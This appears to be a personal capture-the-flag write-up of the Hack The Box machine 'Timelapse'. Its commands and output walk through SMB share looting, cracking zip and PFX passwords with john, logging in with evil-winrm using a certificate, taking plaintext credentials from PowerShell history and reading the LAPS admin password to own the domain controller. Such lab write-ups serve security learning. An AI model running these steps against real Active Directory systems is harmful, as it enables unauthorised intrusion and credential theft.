```
Nmap scan report for 10.10.11.152
Host is up (0.034s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-10 22:08:40Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49721/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

lets dig deeper:
```
sudo nmap -sS -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,49721 10.10.11.152

Nmap scan report for 10.10.11.152
Host is up (0.028s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-11 08:18:41Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: 2025-09-11T08:20:11+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49721/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-09-11T08:19:32
|_  start_date: N/A
```
`dc01.timelapse.htb`
and
`timelapse.htb`
cool
also can see smb on port 445, lets look further into that:
```
smbclient -N -L //10.10.11.152//                                                                                        
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
```

cool lets also try:
```
smbclient -N //10.10.11.152/Shares
```
```
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
```

alright!
Lets take a peek in here....
grabbed all files:
```
helpdesk:
 LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

Dev:
winrm_backup.zip 
```


```
unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```
googled about how to crack this zip file: `https://www.esecurityplanet.com/products/john-the-ripper/`
ill run:
```
zip2john winrm_backup.zip > hash.txt
and get:
cat hash.txt             
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373
...
```
lets crack this sucker!
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pkzip hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
...
```
`supremelegacy`

Now:
```
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx   
```

A .pfx file, also known as a [PKCS#12 file](https://www.google.com/search?sca_esv=e20ef5b3db63d22c&cs=1&sxsrf=AE3TifOqDK3brkbhsGYbkKWVrPJSljhR6Q%3A1757551664356&q=PKCS%2312+file&sa=X&ved=2ahUKEwjcxtCUvs-PAxViEFkFHWLsMU8QxccNegQIAhAB&mstk=AUtExfCUq0_rKK47MeRU0CgKvZE8ognXX6xAiJrdoRgQTxXGUubZVwUdY98-N_ITTifTTN22JmMuhGJVjgvB3OUvyQz8dNXxWGJisUaOmL1g2wNq_J6KZ3YZcQZ6YGwe6aFrzn4ijLtGxFInYhf1osmEMw8k_eX7SqbexFuFzhRRUN4ng94&csui=3), is a binary format that securely stores a digital certificate, its corresponding private key, and any necessary intermediate certificates all in one file.

```
openssl rsa -in legacyy_dev_auth.pfx -check 
Enter pass phrase for PKCS12 import pass phrase:
Could not find private key from legacyy_dev_auth.pfx
4087EC09417F0000:error:16000071:STORE routines:try_pkcs12:error verifying pkcs12 mac:../crypto/store/store_result.c:594:empty password
```

We can use `pfx2john` to get another hash now...:
```
 pfx2john legacyy_dev_auth.pfx > legacy.hash
 
 legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207
 ...
```

again lets crack:
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx legacy.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
```
`thuglegacy`

now we can extract key and cert:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
AND
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
```
nice password worked and i got key and cert.pem files!

```
evil-winrm -S -i 10.10.11.152 -p 5986 -c cert.pem -k key.pem -u legacyy_dev
```
-S = tells Evil-WinRM to use **SSL/TLS (HTTPS)** instead of HTTP

because of our nmap scan as you can see the winrm port is on 5986 which if you google means it is just over https instead of http which if it were http the default port is 5985 :)

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> cat ../Desktop/user.txt
68e304f9e8d2***********
```

User PWNED!

---

### Priv Esc

basic enum:
```
hostname

dc01
```

```
whoami /priv

SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
whoami /groups
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I will look in:
`(Get-PSReadLineOption).HistorySavePath`
`C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt`
see if there is any interesting data in here...
```
cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
looks like plaintext pass for `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

so the scrip there didnt work for me so i ran:
```
$u = 'svc_deploy'
$p = 'E3R$Q62^12p7PLlC%KWaxuaV'
$sec = ConvertTo-SecureString $p -AsPlainText -Force
$cred = New-Object pscredential("$env:USERDOMAIN\$u",$sec)
```
then:
```
Get-ADPrincipalGroupMembership -Identity $u -Credential $cred |
  Select-Object Name, SamAccountName

Name                    SamAccountName
----                    --------------
Domain Users            Domain Users
Remote Management Users Remote Management Users
LAPS_Readers            LAPS_Readers
```
we can see they are in LAPS_READERS group... can also run other commands but lets look into this more...

LAPS = Local Administrator Password Solution fyi :D

ill simply just run this powershell command after some google searching:
first add couple more env vars:
```
$cred = New-Object pscredential("$env:USERDOMAIN\$u",$sec)
$comp = $env:COMPUTERNAME
```

then:
```
Get-ADComputer -Identity $comp -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' -Credential $cred
```

```
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : ]C8+ORRwSSOM#QY(&9,y.M)V
ms-Mcs-AdmPwdExpirationTime : 134024005181815869
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :
```

---
Could have also:
```
evil-winrm -S -i 10.10.11.152 -P 5986 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```
then ran:
```
Get-ADComputer -Identity $env:COMPUTERNAME -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime'
```

to get same output:
```
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : ]C8+ORRwSSOM#QY(&9,y.M)V
ms-Mcs-AdmPwdExpirationTime : 134024005181815869
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :
```
(this is the easy way but atleast i documented both ways...)

---

HELLO!

```
evil-winrm -S -i 10.10.11.152 -P 5986 -u Administrator -p ']C8+ORRwSSOM#QY(&9,y.M)V'
```

```
cat C:\Users\TRX\Desktop\root.txt
135fd902ef02c2**************
```

DC PWNED!

